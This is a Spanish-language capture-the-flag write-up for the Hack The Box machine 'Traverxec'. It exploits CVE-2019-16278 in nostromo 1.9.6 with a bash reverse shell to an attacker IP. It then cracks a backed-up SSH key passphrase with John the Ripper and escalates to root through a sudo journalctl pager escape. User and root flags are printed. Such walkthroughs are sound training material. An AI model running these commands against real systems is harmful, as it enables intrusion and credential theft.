# Traverxec — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Traverxec](https://app.hackthebox.com/machines/Traverxec) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Linux (Debian) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

```bash
nmap -p- -sCV -T5 10.129.1.169 -oN Traverxec
```

![Nmap Scan](images/01.JPG)

| Puerto | Servicio | Versión |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.9p1 Debian |
| 80/tcp | HTTP | **nostromo 1.9.6** |

El servidor web es **nostromo** (nhttpd), un servidor HTTP poco común. El título de la página es `TRAVERXEC`.

---

## Enumeración Web

Al acceder al puerto 80 se muestra la página personal de **David White**:

![Web](images/02.JPG)

La página es estática y no tiene funcionalidad interactiva aparente. El punto de interés es la versión del servidor: **nostromo 1.9.6**, que tiene una vulnerabilidad crítica conocida.

---

## Acceso Inicial — CVE-2019-16278 (Nostromo RCE)

**nostromo 1.9.6** es vulnerable a ejecución remota de código no autenticada (CVE-2019-16278) mediante traversal de directorios en el manejo de peticiones HTTP. Cualquier atacante puede ejecutar comandos arbitrarios en el servidor sin necesidad de credenciales.

### Clonar el exploit

```bash
git clone https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE
```

![Git Clone](images/03.JPG)

### Verificar ejecución de comandos

Se comprueba primero que el exploit funciona ejecutando `whoami`:

```bash
python2 CVE-2019-16278.py -t 10.129.1.169 -p 80 -c whoami
```

![Whoami Test](images/04.JPG)

La respuesta confirma que el servidor ejecuta los comandos como `www-data`.

### Preparar la reverse shell

Se genera el payload en [revshells.com](https://www.revshells.com) y se abre el listener:

```bash
nc -lvnp 9001
```

![Listener](images/05.JPG)

![RevShells](images/06.JPG)

### Lanzar el exploit

```bash
python2 CVE-2019-16278.py -t 10.129.1.169 -p 80 -c "bash -c 'bash -i >& /dev/tcp/10.10.14.137/9001 0>&1'"
```

![Exploit](images/07.JPG)

### Shell recibida

![Shell www-data](images/08.JPG)

Acceso como **`www-data`**.

---

## Movimiento Lateral — De www-data a david

### Área protegida de la web

Explorando el directorio home de `david`, se descubre una carpeta accesible para `www-data`:

```bash
cd /home/david/public_www/protected-file-area
ls -la
```

![Protected Area](images/09.JPG)

Contenido:
- `.htaccess` — protección HTTP básica
- `backup-ssh-identity-files.tgz` — copia de seguridad de claves SSH de david

### Extracción del backup

Al intentar extraer directamente en el directorio actual los permisos lo impiden. Se cambia a `/tmp`:

```bash
cd /tmp
tar -xvzf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

![Tar Extract](images/10.JPG)

Se extrae la clave privada SSH de david:

```bash
cat /tmp/home/david/.ssh/id_rsa
```

La clave está **cifrada con passphrase** (`Proc-Type: 4,ENCRYPTED`).

### Guardar y crackear la clave

Se copia la clave en la máquina atacante y se ajustan los permisos:

![Save id_rsa](images/11.JPG)

```bash
chmod 600 id_rsa
```

Al intentar conectar pide la passphrase:

```bash
ssh -i id_rsa david@10.129.1.169
```

![SSH Passphrase](images/12.JPG)

Se usa **John the Ripper** para crackear la passphrase:

```bash
john --wordlist=/home/kali/Escritorio/rockyou.txt hash.txt
john --show hash.txt
```

![John Crack](images/13.JPG)

Passphrase encontrada: **`hunter`**

### Acceso SSH como david

```bash
ssh -i id_rsa david@10.129.1.169
# Enter passphrase for key 'id_rsa': hunter
```

![SSH David](images/14.JPG)

### Flag de usuario

```bash
cat user.txt
```

Flag: **`7556c5a03841c5b2e6e5486bb837814e`**

---

## Escalada de Privilegios

### Análisis del directorio bin de david

En el home de david hay un directorio `bin` con un script interesante:

```bash
cat ~/bin/server-stats.sh
```

![server-stats.sh](images/15.JPG)

El script contiene la siguiente línea relevante:

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Esto implica que `david` puede ejecutar `journalctl` como `root` sin contraseña. Sin embargo, la tubería con `| /usr/bin/cat` eliminaría el paginador interactivo. Se ejecuta el comando **sin el pipe** para que `journalctl` abra su paginador (`less`):

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

![journalctl](images/16.JPG)

![journalctl output](images/17.JPG)

`journalctl` usa `less` como paginador. Cuando `less` está activo se puede escapar a una shell ejecutando:

```
!/bin/bash
```

Dado que `journalctl` se ejecuta como `root`, la shell resultante también es de `root`. Este vector está documentado en [GTFOBins — journalctl](https://gtfobins.github.io/gtfobins/journalctl/).

> **Nota:** Para que el paginador se active, la terminal debe ser suficientemente pequeña para que el output no quepa en pantalla. Si se muestra todo de golpe sin paginar, hay que reducir el tamaño de la ventana de terminal antes de ejecutar el comando.

### Flag de root

```bash
cd /root
ls
cat root.txt
```

![Root Flag](images/18.JPG)

Flag: **`41aa9f9f751dc559f32b60c6c3e09d4b`**

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Acceso inicial | RCE — CVE-2019-16278 (nostromo 1.9.6) | `python2` + `nc` |
| Reconocimiento interno | Exploración de directorios web | Shell |
| Obtención de clave SSH | Backup en área protegida de la web | `tar` |
| Crackeo de passphrase | Fuerza bruta sobre clave RSA cifrada | `john` + `rockyou.txt` |
| Acceso como david | SSH con clave privada | `ssh -i id_rsa` |
| Escalada | Sudo + GTFOBins (`journalctl` → `less` → `!/bin/bash`) | `journalctl` |
